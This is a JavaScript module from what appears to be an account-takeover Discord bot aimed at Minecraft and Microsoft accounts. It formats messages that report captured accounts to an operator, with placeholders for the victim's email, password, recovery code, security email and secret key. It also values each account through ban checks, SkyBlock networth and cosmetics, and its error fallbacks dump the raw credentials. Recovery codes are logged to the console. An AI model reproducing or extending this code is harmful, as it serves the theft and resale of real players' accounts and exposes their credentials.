const defaultEmbeds = require("./defaultEmbeds");
const { queryParams } = require("../../../db/database");
const shorten = require("short-number");
const { formatOwnedGames } = require("../minecraft/ownedGames");

const safeShort = (n) => {
  const num = typeof n === "number" ? n : Number(n);
  if (isNaN(num)) return "0";
  return shorten(num);
};




async function getembedautosec(client, embed, acc, interaction) {
    try {
       // console.log(acc);
        let id = client.username;
        let e = await client.queryParams(`SELECT * FROM embeds WHERE user_id=? AND type=?`, [id, embed]);
        let msg = null;

        if (e.length === 0) {
            msg = defaultEmbeds(embed);
        } else {
            msg = JSON.parse(e[0].embed);
            console.log(`embed autosec rec: ${acc?.recoveryCode}`);
        }

        if (embed === 'listaccount' && acc || embed === 'statsmsg' && acc) {
            const replacePlaceholders = (text) => {
                if (!text || typeof text !== 'string') return text || "";

                let result = text;

                const sbProfile = acc?.stats?.skyblock?.find(p => p.current) || acc?.stats?.skyblock?.[0] || {};
                const skills = sbProfile.skills || {};
                const slayers = sbProfile.slayers || {};
                const mining = sbProfile.mining || {};
                const catacombs = sbProfile.catacombs || {};
                const bedwars = acc?.stats?.bedwars || {};
                const skywars = acc?.stats?.skywars || {};
                const duels = acc?.stats?.duels || {};

                const ownsMcText = formatOwnedGames(acc);
                const isNoMc = ownsMcText === "No Minecraft!" || acc?.mc === "No Minecraft!" || acc?.mc === "XBL Failed" || acc?.hasmc === false;
                const finalUsername = (isNoMc || !acc?.newName || acc?.newName === acc?.gamertag || acc?.newName === "No Minecraft Profile" || acc?.newName === "No Minecraft!")
                    ? "Couldn't find!"
                    : acc.newName;

                const replacements = {
                    "%UID%": acc.uid || "",  
                    "%USER%": interaction.user.username || "",
                    "%USERID%": interaction.user.id || "",
                    "%OLDNAME%": finalUsername,
                    "%NEWNAME%": finalUsername,
                    "%HIDDENUSERNAME%": finalUsername === "Couldn't find!" ? "Couldn't find!" : (
                        finalUsername.length > 2
                            ? finalUsername[0] + '*'.repeat(finalUsername.length - 2) + finalUsername.at(-1)
                            : "*-*"
                    ),
                    "%EMAIL%": acc?.email || "",
                    "%OLDEMAIL%": acc?.oldEmail || "",
                    "%HIDDENEMAIL%": acc?.email ? (
    acc.email.indexOf('@') > 1
        ? acc.email[0] + '*******' + acc.email[acc.email.indexOf('@') - 1] + acc.email.substring(acc.email.indexOf('@'))
        : "*-*"+ acc.email.substring(acc.email.indexOf('@'))
) : "",
                    "%SECURITY%": acc?.secEmail || "",
                    "%SECRETKEY%": acc?.secretkey || "",
                    "%RECOVERY%": acc?.recoveryCode ? acc.recoveryCode : "Failed (dm me asap)",
                    "%OWNSMC%": formatOwnedGames(acc),
                    "%PASSWORD%": acc?.password || "",
                    "%CAPES%": Array.isArray(acc?.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None",
                    "%TIMETAKEN%": acc?.timeTaken || "",

                    "%DONUTMONEY%": acc?.donut?.money !== undefined ? safeShort(acc.donut.money) : "0",
                    "%DONUTPLAYTIME%": acc?.donut?.playtime || "0m",
                    "%DONUTSHARDS%": acc?.donut?.shards !== undefined ? safeShort(acc.donut.shards) : "0",
                    "%DONUTKILLS%": acc?.donut?.kills?.toString() || "0",
                    "%DONUTDEATHS%": acc?.donut?.deaths?.toString() || "0",
                    "%DONUTKDR%": acc?.donut?.kdr || "0.00",
                    "%DONUTRANK%": acc?.donut?.rank || "None",

                    "%FEATHERCOSMETICS%": acc?.feather?.cosmetics || "None",

                    "%LUNARCOSMETICS%": acc?.lunar?.cosmetics || "None",
                    "%LUNARCOSAMOUNT%": acc?.lunar?.cosamount || 0,
                    "%LUNAREMOTES%": acc?.lunar?.emotes || "None",
                    "%LUNAREMOTEAMOUNT%": acc?.lunar?.emoteamount || 0,
                    "%LUNARPLUSCOSMETICS%": acc?.lunar?.plusCosmetics || "None",
                    "%LUNAREQUIPPEDCOSMETICS%": acc?.lunar?.equippedCosmetics || "None",
                    "%LUNAREQUIPPEDEMOTES%": acc?.lunar?.equippedEmotes || "None",
                    "%LUNARRANK%": acc?.lunar?.rank || "None",

                    "%RANK%": acc?.stats?.rank || "None",
                    "%NWL%": safeShort(acc?.stats?.nwl),
                    "%GIFTED%": safeShort(acc?.stats?.giftedranks),
                    "%STATUS%": acc?.stats?.online === true ? "Online" : acc?.stats?.online === false ? "Offline" : "Unknown",
                    "%GAME%": acc?.stats?.game || "Couldn't find game!",
                    "%PLUSCOLOR%": acc?.stats?.color || "Unknown color",
                    "%BAN%": acc?.banReason === "invalid_token"
                        ? "Invalid SSID!"
                        : typeof acc?.ban === "string" && acc.ban.startsWith("Couldn't check ban:")
                            ? `Couldn't check ban: ${acc.banReason || "Unknown"}`
                            : acc?.ban === true
                                ? `Banned: ${acc.banReason || "Unknown"}`
                                : acc?.ban === false
                                    ? "Unbanned"
                                    : "",
                    "%BAN_HYPIXEL%": acc?.banReason === "invalid_token"
                        ? "Invalid SSID!"
                        : typeof acc?.ban === "string" && acc.ban.startsWith("Couldn't check ban:")
                            ? `Couldn't check: ${acc.banReason || "Unknown"}`
                            : acc?.ban === true
                                ? `Banned (${acc.banReason || "Unknown"})`
                                : acc?.ban === false
                                    ? "Clean"
                                    : "Not checked",
                    "%HPXBAN%": acc?.ban === true ? `Banned (${acc.banReason || "Unknown"})` : acc?.ban === false ? "Clean" : "Not checked",
                    "%BAN_DONUT%": typeof acc?.donutBan === "string" && acc.donutBan.startsWith("Couldn't check ban:")
                        ? `Couldn't check: ${acc.donutBanReason || "Unknown"}`
                        : acc?.donutBan === true
                            ? `Banned (${acc.donutBanReason || "Unknown"})`
                            : acc?.donutBan === false
                                ? "Clean"
                                : "Not checked",
                    "%DONUTBAN%": acc?.donutBan === true ? `Banned (${acc.donutBanReason || "Unknown"})` : acc?.donutBan === false ? "Clean" : "Not checked",
                    "%BAN_MCPVP%": typeof acc?.mcpvpBan === "string" && acc.mcpvpBan.startsWith("Couldn't check ban:")
                        ? `Couldn't check: ${acc.mcpvpBanReason || "Unknown"}`
                        : acc?.mcpvpBan === true
                            ? `Banned (${acc.mcpvpBanReason || "Unknown"})`
                            : acc?.mcpvpBan === false
                                ? "Clean"
                                : "Not checked",
                    "%MCPVPBAN%": acc?.mcpvpBan === true ? `Banned (${acc.mcpvpBanReason || "Unknown"})` : acc?.mcpvpBan === false ? "Clean" : "Not checked",
                    "%BANSTATUS%": `Hypixel: ${acc?.ban === true ? '🔴 Banned' : acc?.ban === false ? '🟢 Clean' : '⚪ -'} | Donut: ${acc?.donutBan === true ? '🔴 Banned' : acc?.donutBan === false ? '🟢 Clean' : '⚪ -'} | MCPVP: ${acc?.mcpvpBan === true ? '🔴 Banned' : acc?.mcpvpBan === false ? '🟢 Clean' : '⚪ -'}`,
                    "%ALLBAN%": `Hypixel: ${acc?.ban === true ? '🔴 Banned' : acc?.ban === false ? '🟢 Clean' : '⚪ -'} | Donut: ${acc?.donutBan === true ? '🔴 Banned' : acc?.donutBan === false ? '🟢 Clean' : '⚪ -'} | MCPVP: ${acc?.mcpvpBan === true ? '🔴 Banned' : acc?.mcpvpBan === false ? '🟢 Clean' : '⚪ -'}`,

                    "%NETWORTHTOTAL%": safeShort(sbProfile.networth),
                    "%NETWORTHSOULBOUND%": safeShort(sbProfile.networth - sbProfile.unsoulboundNetworth),
                    "%NETWORTHUNSOULBOUND%": safeShort(sbProfile.unsoulboundNetworth),
                    "%LIQUID%": safeShort(sbProfile.liquid),
                    "%SA%": skills.avg?.toString() || "0",
                    "%SBLVL%": sbProfile.levels?.toString() || "0",
                    "%COOPSTATUS%": sbProfile.members > 1 ? `Co-op (${sbProfile.members} members)` : "Solo",
                    "%MINIONS%": sbProfile.minionSlots?.toString() || "0",
                    "%UNIQUEMINIONS%": sbProfile.craftedMinions?.toString() || "0",

                    "%MINING%": skills.Mining?.toString() || "0",
                    "%TAMING%": skills.Taming?.toString() || "0",
                    "%FORAGING%": skills.Foraging?.toString() || "0",
                    "%FARMING%": skills.Farming?.toString() || "0",
                    "%COMBAT%": skills.Combat?.toString() || "0",
                    "%ALCHEMY%": skills.Alchemy?.toString() || "0",
                    "%ENCHANTING%": skills.Enchanting?.toString() || "0",
                    "%FISHING%": skills.Fishing?.toString() || "0",
                    "%CARPENTRY%": skills.Carpentry?.toString() || "0",
                    "%RUNECRAFTING%": skills.Runecrafting?.toString() || "0",
                    "%SOCIAL%": skills.Social?.toString() || "0",

                    "%DUNGEON%": catacombs.level?.toString() || "0",
                    "%ZOMBIE%": slayers.zombie?.toString() || "0",
                    "%SVEN%": slayers.wolf?.toString() || "0",
                    "%SPIDER%": slayers.spider?.toString() || "0",
                    "%ENDERMAN%": slayers.enderman?.toString() || "0",
                    "%BLAZE%": slayers.blaze?.toString() || "0",
                    "%VAMPIRE%": slayers.vampire?.toString() || "0",

                    "%HOTMLEVEL%": mining.hotm?.toString() || "0",
                    "%MITHRIL%": safeShort(mining.mithrilPowder),
                    "%GEMSTONE%": safeShort(mining.gemstonePowder),
                    "%GLACITE%": safeShort(mining.glacitePowder),

                    "%BEDWARSTARS%": bedwars.level?.toString() || "0",
                    "%BEDWARCOINS%": safeShort(bedwars.coins),
                    "%BEDWARKILLS%": bedwars.kills?.toString() || "0",
                    "%BEDWARFINALKILLS%": bedwars.finalKills?.toString() || "0",
                    "%BEDWARFINALDEATHS%": bedwars.finalDeaths?.toString() || "0",
                    "%BEDWARFKDR%": bedwars.fkdr || "0",
                    "%BEDWARWINS%": bedwars.wins?.toString() || "0",
                    "%BEDWARLOSSES%": bedwars.losses?.toString() || "0",
                    "%BEDWARWLR%": bedwars.wlr || "0",
                    "%BEDWARBROKENBEDS%": bedwars.bedsBroken?.toString() || "0",
                    "%BEDWARLOSTBEDS%": bedwars.bedsLost?.toString() || "0",
                    "%BEDWARBBLR%": bedwars.bblr || "0",

                    "%SKYWARLEVELS%": skywars.levels?.toString() || "0",
                    "%SKYWARCOINS%": safeShort(skywars.coins),
                    "%SKYWARASSISTS%": skywars.assists?.toString() || "0",
                    "%SKYWARKILLS%": skywars.kills?.toString() || "0",
                    "%SKYWARDEATHS%": skywars.deaths?.toString() || "0",
                    "%SKYWARKDR%": skywars.kdr || "0",
                    "%SKYWARWINS%": skywars.wins?.toString() || "0",
                    "%SKYWARLOSSES%": skywars.losses?.toString() || "0",
                    "%SKYWARWINRATE%": skywars.wlr || "0",

                    "%DUELTITLE%": duels.title || "None",
                    "%DUELGAMESPLAYED%": duels.totalGamesPlayed?.toString() || "0",
                    "%DUELCOINS%": safeShort(duels.coins),
                    "%DUELKILLS%": duels.kills?.toString() || "0",
                    "%DUELDEATHS%": duels.deaths?.toString() || "0",
                    "%DUELKLR%": duels.KLRatio || "0",
                    "%DUELWINS%": duels.wins?.toString() || "0",
                    "%DUELLOSSES%": duels.losses?.toString() || "0",
                    "%DUELWINRATE%": duels.WLRatio || "0"
                };

                Object.entries(replacements).forEach(([placeholder, value]) => {
                    result = result.replaceAll(placeholder, value);
                });

                return result;
            };

            const processObject = (obj) => {
                if (!obj || typeof obj !== 'object') return obj;
                if (Array.isArray(obj)) return obj.map(processObject);
                const result = {};
                for (const [k, v] of Object.entries(obj)) {
                    result[k] = typeof v === 'string' ? replacePlaceholders(v)
                        : typeof v === 'object' && v !== null ? processObject(v)
                        : v;
                }
                return result;
            };

            try {
                msg = processObject(msg);
            } catch (processError) {
                console.error(`Error processing embed placeholders: ${processError.message}`, processError);
                msg = `Username: ${acc?.newName || "Unknown"}
Owns MC: ${acc?.mc || "Unknown"}
Capes: ${Array.isArray(acc?.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None"}
Recovery Code: ${acc?.recoveryCode || "None"}
Primary Email: ${acc?.email || "Unknown"}
Security Email: ${acc?.secEmail || "Unknown"}
Secret Key: ${(acc && acc.secretkey !== undefined && acc.secretkey !== "") ? acc.secretkey : "Failed"}

Password: ${acc?.password || "None"}`;
            }
        }

        return msg;
    } catch (error) {
        console.error(`Error in getembedautosec: ${error.message}`, error);
        return `Username: ${acc?.newName || "Unknown"}
Owns MC: ${acc?.mc || "Unknown"}
Capes: ${Array.isArray(acc?.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None"}
Recovery Code: ${acc?.recoveryCode || "None"}
Primary Email: ${acc?.email || "Unknown"}
Security Email: ${acc?.secEmail || "Unknown"}
Secret Key: ${acc?.secretkey || "None"}
Password: ${acc?.password || "None"}`;
    }
}

module.exports = getembedautosec;
